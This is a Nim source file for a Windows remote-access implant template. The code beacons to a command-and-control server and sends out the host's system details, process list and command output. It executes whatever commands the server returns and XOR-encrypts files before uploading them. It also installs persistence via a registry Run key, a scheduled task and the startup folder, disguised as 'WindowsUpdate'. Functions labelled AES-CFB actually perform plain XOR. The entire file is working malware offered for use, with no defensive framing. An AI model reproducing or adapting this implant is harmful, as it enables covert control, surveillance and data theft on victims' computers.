import std/[httpclient, json, base64, os, osproc, times, strutils, random]
import puppy
import winim/lean

const
  C2_SERVER = "{{.ServerIP}}"
  C2_PORT = "{{.ServerPort}}"
  C2_URL = "https://" & C2_SERVER & ":" & C2_PORT
  COOKIE_NAME = "sessionid"
  MALWARE_KEY = "{{.MalwareKey}}" # Replace with your 16-byte key
  XOR_KEY = "{{.XORKey}}"       # Replace with your XOR key
  SLEEP_MIN = 30                   # Minimum sleep time in seconds
  SLEEP_MAX = 60                   # Maximum sleep time in seconds
  PERSISTENCE_NAME = "WindowsUpdate"

type
  Action = object
    action: string

  InfoData = object
    publicip: string
    username: string
    devicename: string
    region: string
    memory: string
    netinfo: string
    osinfo: string

  ProcessData = object
    process: string

  CommandOutData = object
    command: string
    output: string

# AES-CFB encryption
proc malEncode(key, data: string): string =
  # This is a simplified version for the template
  # In a real implementation, you would use proper AES-CFB encryption
  var encoded = ""
  for i in 0..<data.len:
    encoded.add(char(ord(data[i]) xor ord(key[i mod key.len])))
  return base64.encode(encoded)

# AES-CFB decryption
proc malDecode(key, data: string): string =
  # This is a simplified version for the template
  # In a real implementation, you would use proper AES-CFB decryption
  let decoded = base64.decode(data)
  var result = ""
  for i in 0..<decoded.len:
    result.add(char(ord(decoded[i]) xor ord(key[i mod key.len])))
  return result

# XOR encryption for files
proc fileEncrypt(filePath: string): bool =
  try:
    var data = readFile(filePath)
    var encrypted = ""
    for i in 0..<data.len:
      encrypted.add(char(ord(data[i]) xor ord(XOR_KEY[i mod XOR_KEY.len])))
    writeFile(filePath, encrypted)
    return true
  except:
    return false

# Get system information
proc getSystemInfo(): InfoData =
  var info: InfoData
  
  # Get public IP
  try:
    let client = newHttpClient()
    info.publicip = client.getContent("https://api.ipify.org")
  except:
    info.publicip = "Unknown"
  
  # Get username
  info.username = getEnv("USERNAME")
  
  # Get computer name
  info.devicename = getEnv("COMPUTERNAME")
  
  # Get region/locale
  info.region = getEnv("USERDOMAIN")
  
  # Get memory info
  var memStatus: MEMORYSTATUSEX
  memStatus.dwLength = sizeof(MEMORYSTATUSEX).DWORD
  if GlobalMemoryStatusEx(addr memStatus) != 0:
    let totalPhysMB = int(memStatus.ullTotalPhys / (1024 * 1024))
    let availPhysMB = int(memStatus.ullAvailPhys / (1024 * 1024))
    info.memory = "Total: " & $totalPhysMB & " MB, Available: " & $availPhysMB & " MB"
  else:
    info.memory = "Unknown"
  
  # Get network info
  var adapters = ""
  try:
    let output = execProcess("ipconfig /all")
    adapters = output
  except:
    adapters = "Failed to get network adapters"
  info.netinfo = adapters
  
  # Get OS info
  var osInfo = ""
  try:
    let output = execProcess("systeminfo")
    osInfo = output
  except:
    osInfo = "Failed to get OS info"
  info.osinfo = osInfo
  
  return info

# Get process list
proc getProcessList(): string =
  try:
    let output = execProcess("tasklist /v")
    return output
  except:
    return "Failed to get process list"

# Execute command
proc executeCommand(command: string): string =
  try:
    let output = execProcess("cmd /c " & command)
    return output
  except:
    return "Failed to execute command"

# Check if file exists
proc fileExists(path: string): bool =
  try:
    let f = open(path)
    f.close()
    return true
  except:
    return false

# Add persistence
proc addPersistence() =
  # Get current executable path
  let exePath = getAppFilename()
  
  # Add to registry run key
  try:
    let cmd = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v " & 
              PERSISTENCE_NAME & " /t REG_SZ /d \"" & exePath & "\" /f"
    discard execProcess(cmd)
  except:
    discard
  
  # Add scheduled task
  try:
    let cmd = "schtasks /create /tn \"" & PERSISTENCE_NAME & "\" /sc onlogon /tr \"" & 
              exePath & "\" /rl highest /f"
    discard execProcess(cmd)
  except:
    discard
  
  # Copy to startup folder
  try:
    let startupDir = getEnv("APPDATA") & "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
    let startupPath = startupDir & "\\" & PERSISTENCE_NAME & ".exe"
    copyFile(exePath, startupPath)
  except:
    discard

# Check if has persistence
proc hasPersistence(): bool =
  # Check registry run key
  try:
    let cmd = "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v " & PERSISTENCE_NAME
    let output = execProcess(cmd)
    if output.contains(PERSISTENCE_NAME):
      return true
  except:
    discard
  
  # Check scheduled task
  try:
    let cmd = "schtasks /query /tn \"" & PERSISTENCE_NAME & "\""
    let output = execProcess(cmd)
    if output.contains(PERSISTENCE_NAME):
      return true
  except:
    discard
  
  # Check startup folder
  try:
    let startupDir = getEnv("APPDATA") & "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
    let startupPath = startupDir & "\\" & PERSISTENCE_NAME & ".exe"
    if fileExists(startupPath):
      return true
  except:
    discard
  
  return false

# Heartbeat
proc heartbeat(sessionID: string): tuple[action: string, sessionID: string] =
  try:
    var client = newHttpClient()
    client.headers = newHttpHeaders({"Content-Type": "application/octet-stream"})
    
    if sessionID != "":
      client.headers["Cookie"] = COOKIE_NAME & "=" & sessionID
    
    let response = client.post(C2_URL & "/heartbeat", "")
    
    # Get session ID from cookie
    var newSessionID = sessionID
    for cookie in response.headers.getOrDefault("Set-Cookie").split(';'):
      if cookie.startsWith(COOKIE_NAME & "="):
        newSessionID = cookie.split('=')[1]
        break
    
    # Decode response
    let action = malDecode(MALWARE_KEY, response.body)
    
    return (action: action, sessionID: newSessionID)
  except:
    return (action: "error", sessionID: sessionID)

# Send info
proc sendInfo(sessionID: string) =
  if sessionID == "":
    return
  
  try:
    var client = newHttpClient()
    client.headers = newHttpHeaders({
      "Content-Type": "application/octet-stream",
      "Cookie": COOKIE_NAME & "=" & sessionID
    })
    
    let info = getSystemInfo()
    let jsonData = $(%info)
    let encoded = malEncode(MALWARE_KEY, jsonData)
    
    discard client.post(C2_URL & "/info", encoded)
  except:
    discard

# Send process list
proc sendProcessList(sessionID: string) =
  if sessionID == "":
    return
  
  try:
    var client = newHttpClient()
    client.headers = newHttpHeaders({
      "Content-Type": "application/octet-stream",
      "Cookie": COOKIE_NAME & "=" & sessionID
    })
    
    let processList = getProcessList()
    let procData = ProcessData(process: processList)
    let jsonData = $(%procData)
    let encoded = malEncode(MALWARE_KEY, jsonData)
    
    discard client.post(C2_URL & "/ps", encoded)
  except:
    discard

# Send command output
proc sendCommandOutput(sessionID, command, output: string) =
  if sessionID == "":
    return
  
  try:
    var client = newHttpClient()
    client.headers = newHttpHeaders({
      "Content-Type": "application/octet-stream",
      "Cookie": COOKIE_NAME & "=" & sessionID
    })
    
    let cmdData = CommandOutData(command: command, output: output)
    let jsonData = $(%cmdData)
    let encoded = malEncode(MALWARE_KEY, jsonData)
    
    discard client.post(C2_URL & "/out", encoded)
  except:
    discard

# Upload file
proc uploadFile(sessionID, filePath: string): bool =
  if sessionID == "" or not fileExists(filePath):
    return false
  
  try:
    # First encrypt the file with XOR
    if not fileEncrypt(filePath):
      return false
    
    var client = newHttpClient()
    client.headers = newHttpHeaders({
      "Cookie": COOKIE_NAME & "=" & sessionID
    })
    
    let formData = newMultipartData()
    formData.addFiles({"file": filePath})
    
    let response = client.post(C2_URL & "/upload", formData)
    
    return response.code == Http200
  except:
    return false

# Main function
proc main() =
  # Initialize random seed
  randomize()
  
  # Check and add persistence if needed
  if not hasPersistence():
    addPersistence()
  
  # Main implant loop
  var sessionID = ""
  while true:
    try:
      # Send heartbeat and get action
      let result = heartbeat(sessionID)
      let action = result.action
      sessionID = result.sessionID
      
      # Process the action
      case action
      of "info":
        sendInfo(sessionID)
      of "ps":
        sendProcessList(sessionID)
      of "ok":
        # Just continue with the next heartbeat
        discard
      of "error":
        # Error occurred, just continue
        discard
      else:
        # Assume it's a command to execute
        if action != "":
          let output = executeCommand(action)
          sendCommandOutput(sessionID, action, output)
    except:
      # Just continue if any error occurs
      discard
    
    # Sleep for a random amount of time
    let sleepTime = rand(SLEEP_MIN..SLEEP_MAX)
    sleep(sleepTime * 1000)

# Start the main function
main()
